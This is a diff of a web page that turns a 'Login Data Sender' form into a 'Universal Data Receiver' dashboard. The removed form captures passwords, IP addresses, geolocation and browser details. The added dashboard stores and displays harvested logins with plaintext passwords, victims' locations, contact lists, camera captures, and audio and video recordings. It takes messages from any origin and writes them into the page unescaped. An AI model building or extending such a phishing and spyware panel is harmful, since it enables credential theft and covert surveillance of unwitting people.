@@ -3,256 +3,936 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Data Sender</title>
+    <title>Universal Data Receiver</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f8fa;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
         .container {
-            background: white;
-            padding: 25px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background-color: rgba(30, 41, 59, 0.8);
             border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
+        
         h1 {
-            color: #2c3e50;
-            text-align: center;
-            margin-bottom: 25px;
+            color: #38bdf8;
+            margin-bottom: 10px;
+            font-size: 2.5rem;
         }
-        .form-group {
+        
+        .subtitle {
+            color: #94a3b8;
             margin-bottom: 20px;
+            font-size: 1.2rem;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
+        
+        .server-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            background-color: #10b981;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background-color: rgba(30, 41, 59, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
             font-weight: bold;
-            color: #34495e;
+            color: #38bdf8;
+            margin: 10px 0;
         }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 16px;
-            transition: border-color 0.3s;
+        
+        .stat-label {
+            color: #94a3b8;
+            font-size: 1rem;
         }
-        input:focus, select:focus {
-            border-color: #3498db;
-            outline: none;
-            box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
+        
+        .stat-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #60a5fa;
         }
+        
+        .controls {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
         button {
-            background: #3498db;
+            background-color: #3b82f6;
             color: white;
             border: none;
-            padding: 14px 20px;
-            border-radius: 6px;
+            padding: 12px 20px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            width: 100%;
-            transition: background 0.3s;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1rem;
         }
+        
         button:hover {
-            background: #2980b9;
+            background-color: #2563eb;
         }
-        #status {
-            margin-top: 20px;
+        
+        .data-section {
+            background-color: rgba(30, 41, 59, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #334155;
+        }
+        
+        .section-title {
+            color: #38bdf8;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .section-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .data-card {
+            background-color: rgba(51, 65, 85, 0.6);
+            border-radius: 8px;
             padding: 15px;
-            border-radius: 6px;
-            display: none;
+            transition: transform 0.3s ease;
+        }
+        
+        .data-card:hover {
+            transform: translateY(-3px);
+        }
+        
+        .data-card h3 {
+            color: #93c5fd;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .data-card p {
+            margin-bottom: 8px;
+            color: #cbd5e1;
+        }
+        
+        .media-container {
+            margin-top: 15px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .media-container img, .media-container video {
+            width: 100%;
+            max-height: 250px;
+            object-fit: contain;
+            background-color: #1e293b;
+            border-radius: 5px;
+        }
+        
+        audio {
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .map-container {
+            height: 200px;
+            background-color: #1e293b;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+            color: #94a3b8;
+        }
+        
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            background-color: rgba(30, 41, 59, 0.6);
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+        
+        .contact-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #3b82f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .contact-info {
+            flex: 1;
+        }
+        
+        .contact-name {
+            font-weight: bold;
+            color: #e2e8f0;
+        }
+        
+        .contact-phone {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        
+        .empty-state {
             text-align: center;
+            padding: 30px;
+            color: #94a3b8;
+            grid-column: 1 / -1;
         }
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .view-data-link {
-            display: block;
+        
+        .last-update {
             text-align: center;
+            color: #94a3b8;
             margin-top: 20px;
-            color: #3498db;
-            text-decoration: none;
+            padding: 10px;
         }
-        .view-data-link:hover {
-            text-decoration: underline;
+        
+        .tab-container {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            overflow-x: auto;
+            padding-bottom: 5px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            background-color: rgba(30, 41, 59, 0.6);
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            white-space: nowrap;
+        }
+        
+        .tab.active {
+            background-color: #3b82f6;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            }
+            
+            .section-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .controls {
+                flex-wrap: wrap;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Login Data Sender</h1>
-        
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="identifier">Email/Phone/Username:</label>
-                <input type="text" id="identifier" required placeholder="Enter your email, phone or username">
+        <header>
+            <h1><i class="fas fa-server"></i> Universal Data Receiver</h1>
+            <p class="subtitle">Receive and view all types of data in their original format</p>
+            <div class="server-status">
+                <div class="status-indicator"></div>
+                <span>Server running and ready to receive data</span>
             </div>
-            
-            <div class="form-group">
-                <label for="password">Password:</label>
-                <input type="password" id="password" required placeholder="Enter your password">
+        </header>
+
+        <div class="dashboard">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-user-circle"></i></div>
+                <div class="stat-number" id="loginCount">0</div>
+                <div class="stat-label">Login Attempts</div>
             </div>
-            
-            <div class="form-group">
-                <label for="loginMethod">Login Method:</label>
-                <select id="loginMethod">
-                    <option value="password">Password</option>
-                    <option value="facebook">Facebook</option>
-                    <option value="google">Google</option>
-                    <option value="twitter">Twitter</option>
-                    <option value="apple">Apple</option>
-                </select>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-camera"></i></div>
+                <div class="stat-number" id="cameraCount">0</div>
+                <div class="stat-label">Camera Captures</div>
             </div>
-            
-            <div class="form-group">
-                <label for="userLocation">Location (optional):</label>
-                <input type="text" id="userLocation" placeholder="Country, City">
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-microphone"></i></div>
+                <div class="stat-number" id="audioCount">0</div>
+                <div class="stat-label">Audio Recordings</div>
             </div>
-            
-            <button type="submit">Send Login Data</button>
-        </form>
-        
-        <div id="status"></div>
-        
-        <a href="server.html" class="view-data-link">View Collected Data →</a>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-video"></i></div>
+                <div class="stat-number" id="videoCount">0</div>
+                <div class="stat-label">Video Recordings</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-map-marker-alt"></i></div>
+                <div class="stat-number" id="locationCount">0</div>
+                <div class="stat-label">Locations</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon"><i class="fas fa-address-book"></i></div>
+                <div class="stat-number" id="contactCount">0</div>
+                <div class="stat-label">Contacts</div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <button id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
+            <button id="clearBtn"><i class="fas fa-trash"></i> Clear All Data</button>
+            <button id="exportBtn"><i class="fas fa-download"></i> Export Data</button>
+            <button id="simulateBtn"><i class="fas fa-bolt"></i> Simulate Data</button>
+        </div>
+
+        <div class="tab-container">
+            <div class="tab active" data-tab="all">All Data</div>
+            <div class="tab" data-tab="logins">Login Attempts</div>
+            <div class="tab" data-tab="media">Media Files</div>
+            <div class="tab" data-tab="locations">Locations</div>
+            <div class="tab" data-tab="contacts">Contacts</div>
+            <div class="tab" data-tab="activity">Activity Log</div>
+        </div>
+
+        <div class="tab-content active" id="all-tab">
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-sign-in-alt"></i> Login Attempts</h2>
+                </div>
+                <div class="section-content" id="loginData"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-map-marker-alt"></i> Location Data</h2>
+                </div>
+                <div class="section-content" id="locationData"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-address-book"></i> Contacts</h2>
+                </div>
+                <div class="section-content" id="contactData"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-camera"></i> Camera Captures</h2>
+                </div>
+                <div class="section-content" id="cameraData"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-video"></i> Video Recordings</h2>
+                </div>
+                <div class="section-content" id="videoData"></div>
+            </div>
+
+            <div class="data-section">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-microphone"></i> Audio Recordings</h2>
+                </div>
+                <div class="section-content" id="audioData"></div>
+            </div>
+        </div>
+
+        <div class="last-update">
+            Last updated: <span id="lastUpdate">Never</span>
+        </div>
     </div>
-    
+
     <script>
-        // Get elements
-        const form = document.getElementById('loginForm');
-        const statusDiv = document.getElementById('status');
+        // Data storage
+        let allData = {
+            loginAttempts: [],
+            locations: [],
+            contacts: [],
+            cameraCaptures: [],
+            videoRecordings: [],
+            audioRecordings: [],
+            activityLog: []
+        };
         
-        // Function to show status message
-        function showStatus(message, isError = false) {
-            statusDiv.textContent = message;
-            statusDiv.className = isError ? 'error' : 'success';
-            statusDiv.style.display = 'block';
-            
-            setTimeout(() => {
-                statusDiv.style.display = 'none';
-            }, 3000);
+        // DOM Elements
+        const refreshBtn = document.getElementById('refreshBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const exportBtn = document.getElementById('exportBtn');
+        const simulateBtn = document.getElementById('simulateBtn');
+        const lastUpdateEl = document.getElementById('lastUpdate');
+        
+        // Count elements
+        const loginCountEl = document.getElementById('loginCount');
+        const cameraCountEl = document.getElementById('cameraCount');
+        const audioCountEl = document.getElementById('audioCount');
+        const videoCountEl = document.getElementById('videoCount');
+        const locationCountEl = document.getElementById('locationCount');
+        const contactCountEl = document.getElementById('contactCount');
+        
+        // Data container elements
+        const loginDataEl = document.getElementById('loginData');
+        const locationDataEl = document.getElementById('locationData');
+        const contactDataEl = document.getElementById('contactData');
+        const cameraDataEl = document.getElementById('cameraData');
+        const videoDataEl = document.getElementById('videoData');
+        const audioDataEl = document.getElementById('audioData');
+        
+        // Tab functionality
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+        
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabId = tab.getAttribute('data-tab');
+                
+                // Update active tab
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                
+                // Show corresponding content
+                tabContents.forEach(content => content.classList.remove('active'));
+                document.getElementById(`${tabId}-tab`).classList.add('active');
+            });
+        });
+        
+        // Initialize the server
+        document.addEventListener('DOMContentLoaded', function() {
+            setupEventListeners();
+            loadStoredData();
+            updateDisplay();
+            startAutoRefresh();
+        });
+        
+        // Set up event listeners
+        function setupEventListeners() {
+            refreshBtn.addEventListener('click', updateDisplay);
+            clearBtn.addEventListener('click', clearAllData);
+            exportBtn.addEventListener('click', exportData);
+            simulateBtn.addEventListener('click', simulateData);
         }
         
-        // Function to get client IP info
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error getting IP:', error);
-                return 'Unknown';
+        // Handle incoming data
+        function handleIncomingData(data) {
+            switch (data.type) {
+                case 'loginData':
+                    handleLoginData(data);
+                    break;
+                case 'locationData':
+                    handleLocationData(data);
+                    break;
+                case 'contactData':
+                    handleContactData(data);
+                    break;
+                case 'cameraData':
+                    handleCameraData(data);
+                    break;
+                case 'videoData':
+                    handleVideoData(data);
+                    break;
+                case 'audioData':
+                    handleAudioData(data);
+                    break;
+                default:
+                    console.log('Unknown data type received:', data.type);
+                    addToActivityLog(`Unknown data type received: ${data.type}`, 'warning');
             }
         }
         
-        // Function to get geolocation data
-        async function getGeolocationData() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    country: data.country_name,
-                    city: data.city,
-                    region: data.region,
-                    latitude: data.latitude,
-                    longitude: data.longitude
-                };
-            } catch (error) {
-                console.error('Error getting geolocation:', error);
-                return {
-                    country: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown'
-                };
+        // Handle login data
+        function handleLoginData(data) {
+            allData.loginAttempts.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog(`Login attempt from ${data.emailOrPhone || 'unknown user'}`, 'success');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Handle location data
+        function handleLocationData(data) {
+            allData.locations.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog(`Location data received from ${data.ip || 'unknown IP'}`, 'info');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Handle contact data
+        function handleContactData(data) {
+            allData.contacts.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog(`Contact data received with ${data.contacts?.length || 0} contacts`, 'info');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Handle camera data
+        function handleCameraData(data) {
+            allData.cameraCaptures.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog('Camera capture received', 'info');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Handle video data
+        function handleVideoData(data) {
+            allData.videoRecordings.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog('Video recording received', 'info');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Handle audio data
+        function handleAudioData(data) {
+            allData.audioRecordings.push({
+                ...data,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            addToActivityLog('Audio recording received', 'info');
+            saveData();
+            updateDisplay();
+        }
+        
+        // Add to activity log
+        function addToActivityLog(message, type = 'info') {
+            allData.activityLog.push({
+                message,
+                type,
+                timestamp: new Date().toISOString(),
+                id: generateId()
+            });
+            
+            // Keep only the last 100 log entries
+            if (allData.activityLog.length > 100) {
+                allData.activityLog = allData.activityLog.slice(-100);
+            }
+            
+            saveData();
+        }
+        
+        // Generate a unique ID
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2);
+        }
+        
+        // Save data to localStorage
+        function saveData() {
+            localStorage.setItem('universalData', JSON.stringify(allData));
+        }
+        
+        // Load stored data from localStorage
+        function loadStoredData() {
+            const storedData = localStorage.getItem('universalData');
+            if (storedData) {
+                allData = JSON.parse(storedData);
             }
         }
         
-        // Function to get browser and OS info
-        function getBrowserInfo() {
-            const userAgent = navigator.userAgent;
-            let browserName = 'Unknown';
-            let osName = 'Unknown';
+        // Update the display with current data
+        function updateDisplay() {
+            // Update statistics
+            loginCountEl.textContent = allData.loginAttempts.length;
+            cameraCountEl.textContent = allData.cameraCaptures.length;
+            audioCountEl.textContent = allData.audioRecordings.length;
+            videoCountEl.textContent = allData.videoRecordings.length;
+            locationCountEl.textContent = allData.locations.length;
+            contactCountEl.textContent = allData.contacts.length;
             
-            // Detect browser
-            if (userAgent.includes('Firefox')) browserName = 'Firefox';
-            else if (userAgent.includes('Chrome')) browserName = 'Chrome';
-            else if (userAgent.includes('Safari')) browserName = 'Safari';
-            else if (userAgent.includes('Edge')) browserName = 'Edge';
-            else if (userAgent.includes('Opera')) browserName = 'Opera';
+            // Update data displays
+            displayLoginData();
+            displayLocationData();
+            displayContactData();
+            displayCameraData();
+            displayVideoData();
+            displayAudioData();
             
-            // Detect OS
-            if (userAgent.includes('Windows')) osName = 'Windows';
-            else if (userAgent.includes('Mac')) osName = 'Mac OS';
-            else if (userAgent.includes('Linux')) osName = 'Linux';
-            else if (userAgent.includes('Android')) osName = 'Android';
-            else if (userAgent.includes('iOS')) osName = 'iOS';
-            
-            return {
-                name: browserName,
-                version: navigator.appVersion,
-                os: osName,
-                language: navigator.language,
-                platform: navigator.platform
-            };
+            // Update last updated timestamp
+            lastUpdateEl.textContent = new Date().toLocaleString();
         }
         
-        // Form submission handler
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Display login data
+        function displayLoginData() {
+            if (allData.loginAttempts.length === 0) {
+                loginDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-sign-in-alt"></i><p>No login attempts yet</p></div>';
+                return;
+            }
             
-            const identifier = document.getElementById('identifier').value;
-            const password = document.getElementById('password').value;
-            const loginMethod = document.getElementById('loginMethod').value;
-            const userLocation = document.getElementById('userLocation').value;
-            const publicIp = await getIPInfo();
-            const locationData = await getGeolocationData();
-            const browserInfo = getBrowserInfo();
+            let html = '';
             
-            // Prepare data to send
-            const loginData = {
-                identifier: identifier,
-                password: password,
-                login_method: loginMethod,
-                user_location: userLocation || `${locationData.city}, ${locationData.country}`,
-                public_ip: publicIp,
-                geolocation: locationData,
-                browser: browserInfo,
-                user_agent: navigator.userAgent,
-                screen_resolution: `${window.screen.width}x${window.screen.height}`,
-                timestamp: new Date().toISOString()
+            // Show only the 6 most recent attempts
+            allData.loginAttempts.slice(-6).reverse().forEach(attempt => {
+                const time = new Date(attempt.timestamp).toLocaleString();
+                html += `
+                    <div class="data-card">
+                        <h3><i class="fas fa-user"></i> Login Attempt</h3>
+                        <p><strong>Time:</strong> ${time}</p>
+                        <p><strong>Identifier:</strong> ${attempt.emailOrPhone || 'N/A'}</p>
+                        <p><strong>Password:</strong> ${attempt.password || 'N/A'}</p>
+                        <p><strong>IP Address:</strong> ${attempt.public_ip || 'Unknown'}</p>
+                        <p><strong>Location:</strong> ${attempt.user_location || 'Unknown'}</p>
+                    </div>
+                `;
+            });
+            
+            loginDataEl.innerHTML = html;
+        }
+        
+        // Display location data
+        function displayLocationData() {
+            if (allData.locations.length === 0) {
+                locationDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-map-marker-alt"></i><p>No location data yet</p></div>';
+                return;
+            }
+            
+            let html = '';
+            
+            // Show only the 4 most recent locations
+            allData.locations.slice(-4).reverse().forEach(location => {
+                const time = new Date(location.timestamp).toLocaleString();
+                html += `
+                    <div class="data-card">
+                        <h3><i class="fas fa-map-pin"></i> Location Data</h3>
+                        <p><strong>Time:</strong> ${time}</p>
+                        <p><strong>IP Address:</strong> ${location.ip || 'Unknown'}</p>
+                        <p><strong>Coordinates:</strong> ${location.latitude || 'N/A'}, ${location.longitude || 'N/A'}</p>
+                        <p><strong>Accuracy:</strong> ${location.accuracy ? location.accuracy + 'm' : 'N/A'}</p>
+                        <p><strong>Address:</strong> ${location.address || 'Unknown'}</p>
+                        <div class="map-container">
+                            <i class="fas fa-map-marked-alt"></i> Map would display here with coordinates
+                        </div>
+                    </div>
+                `;
+            });
+            
+            locationDataEl.innerHTML = html;
+        }
+        
+        // Display contact data
+        function displayContactData() {
+            if (allData.contacts.length === 0) {
+                contactDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-address-book"></i><p>No contact data yet</p></div>';
+                return;
+            }
+            
+            let html = '';
+            
+            // Show contacts from the most recent contact data
+            const recentContacts = allData.contacts[allData.contacts.length - 1];
+            if (recentContacts && recentContacts.contacts) {
+                recentContacts.contacts.slice(0, 6).forEach(contact => {
+                    const initials = contact.name ? contact.name.split(' ').map(n => n[0]).join('') : '?';
+                    html += `
+                        <div class="contact-item">
+                            <div class="contact-avatar">${initials}</div>
+                            <div class="contact-info">
+                                <div class="contact-name">${contact.name || 'Unknown'}</div>
+                                <div class="contact-phone">${contact.phone || 'No phone number'}</div>
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+            
+            contactDataEl.innerHTML = html;
+        }
+        
+        // Display camera data
+        function displayCameraData() {
+            if (allData.cameraCaptures.length === 0) {
+                cameraDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-camera"></i><p>No camera captures yet</p></div>';
+                return;
+            }
+            
+            let html = '';
+            
+            // Show only the 4 most recent items
+            allData.cameraCaptures.slice(-4).reverse().forEach(item => {
+                const time = new Date(item.timestamp).toLocaleString();
+                html += `
+                    <div class="data-card">
+                        <h3><i class="fas fa-camera"></i> Camera Capture</h3>
+                        <p><strong>Time:</strong> ${time}</p>
+                        <div class="media-container">
+                            ${item.imageData ? 
+                                `<img src="${item.imageData}" alt="Camera capture">` : 
+                                '<div style="padding: 40px; text-align: center; color: #94a3b8;"><i class="fas fa-image fa-2x"></i><p>Image preview</p></div>'
+                            }
+                        </div>
+                    </div>
+                `;
+            });
+            
+            cameraDataEl.innerHTML = html;
+        }
+        
+        // Display video data
+        function displayVideoData() {
+            if (allData.videoRecordings.length === 0) {
+                videoDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-video"></i><p>No video recordings yet</p></div>';
+                return;
+            }
+            
+            let html = '';
+            
+            // Show only the 2 most recent items
+            allData.videoRecordings.slice(-2).reverse().forEach(item => {
+                const time = new Date(item.timestamp).toLocaleString();
+                html += `
+                    <div class="data-card">
+                        <h3><i class="fas fa-video"></i> Video Recording</h3>
+                        <p><strong>Time:</strong> ${time}</p>
+                        <div class="media-container">
+                            ${item.videoData ? 
+                                `<video controls><source src="${item.videoData}" type="video/mp4">Your browser does not support the video tag.</video>` : 
+                                '<div style="padding: 40px; text-align: center; color: #94a3b8;"><i class="fas fa-video fa-2x"></i><p>Video preview</p></div>'
+                            }
+                        </div>
+                    </div>
+                `;
+            });
+            
+            videoDataEl.innerHTML = html;
+        }
+        
+        // Display audio data
+        function displayAudioData() {
+            if (allData.audioRecordings.length === 0) {
+                audioDataEl.innerHTML = '<div class="empty-state"><i class="fas fa-microphone"></i><p>No audio recordings yet</p></div>';
+                return;
+            }
+            
+            let html = '';
+            
+            // Show only the 3 most recent items
+            allData.audioRecordings.slice(-3).reverse().forEach(item => {
+                const time = new Date(item.timestamp).toLocaleString();
+                html += `
+                    <div class="data-card">
+                        <h3><i class="fas fa-microphone"></i> Audio Recording</h3>
+                        <p><strong>Time:</strong> ${time}</p>
+                        <div class="media-container">
+                            ${item.audioData ? 
+                                `<audio controls><source src="${item.audioData}" type="audio/webm">Your browser does not support the audio element.</audio>` : 
+                                '<div style="padding: 40px; text-align: center; color: #94a3b8;"><i class="fas fa-volume-up fa-2x"></i><p>Audio playback</p></div>'
+                            }
+                        </div>
+                    </div>
+                `;
+            });
+            
+            audioDataEl.innerHTML = html;
+        }
+        
+        // Clear all data
+        function clearAllData() {
+            if (!confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
+                return;
+            }
+            
+            allData = {
+                loginAttempts: [],
+                locations: [],
+                contacts: [],
+                cameraCaptures: [],
+                videoRecordings: [],
+                audioRecordings: [],
+                activityLog: []
             };
             
-            // Encode data for URL
-            const encodedData = encodeURIComponent(JSON.stringify(loginData));
+            saveData();
+            updateDisplay();
+            addToActivityLog('All data cleared', 'info');
+        }
+        
+        // Export data
+        function exportData() {
+            const dataStr = JSON.stringify(allData, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
             
-            // Get the server URL (assuming it's in the same directory)
-            const serverUrl = window.location.href.replace('sender.html', 'server.html');
+            const exportFileDefaultName = 'universal-data.json';
             
-            // Send data by redirecting to server with data as URL parameter
-            window.open(`${serverUrl}?data=${encodedData}`, '_blank');
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
             
-            // Store data in localStorage for the server page to access
-            const storedData = JSON.parse(localStorage.getItem('loginDataCollection') || '[]');
-            storedData.push(loginData);
-            localStorage.setItem('loginDataCollection', JSON.stringify(storedData));
+            addToActivityLog('Data exported', 'success');
+        }
+        
+        // Simulate data for demonstration
+        function simulateData() {
+            // Simulate login data
+            handleLoginData({
+                type: 'loginData',
+                emailOrPhone: 'user@example.com',
+                password: 'password123',
+                public_ip: '192.168.1.100',
+                user_location: 'New York, US'
+            });
             
-            // Show success message
-            showStatus('Login data sent successfully! You can view it on the server page.');
+            // Simulate location data
+            handleLocationData({
+                type: 'locationData',
+                ip: '192.168.1.100',
+                latitude: 40.7128,
+                longitude: -74.0060,
+                accuracy: 50,
+                address: 'New York, NY, USA'
+            });
             
-            // Reset form
-            form.reset();
+            // Simulate contact data
+            handleContactData({
+                type: 'contactData',
+                contacts: [
+                    { name: 'John Doe', phone: '+1 555-1234' },
+                    { name: 'Jane Smith', phone: '+1 555-5678' },
+                    { name: 'Bob Johnson', phone: '+1 555-9012' }
+                ]
+            });
+            
+            // Simulate camera capture
+            handleCameraData({
+                type: 'cameraData',
+                imageData: 'https://placehold.co/600x400/3b82f6/white?text=Camera+Capture'
+            });
+            
+            // Simulate video recording
+            handleVideoData({
+                type: 'videoData',
+                videoData: 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4'
+            });
+            
+            // Simulate audio recording
+            handleAudioData({
+                type: 'audioData',
+                audioData: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'
+            });
+            
+            alert('Demo data has been added to the receiver!');
+        }
+        
+        // Start auto-refresh
+        function startAutoRefresh() {
+            setInterval(updateDisplay, 5000);
+        }
+        
+        // Listen for messages from other tabs/pages
+        window.addEventListener('message', function(event) {
+            // For security, you might want to verify the origin
+            // if (event.origin !== 'https://your-allowed-domain.com') return;
+            
+            if (event.data) {
+                handleIncomingData(event.data);
+            }
+        });
+        
+        // Listen for storage events (for cross-tab communication)
+        window.addEventListener('storage', function(event) {
+            if (event.key === 'universalData') {
+                loadStoredData();
+                updateDisplay();
+            }
         });
     </script>
 </body>
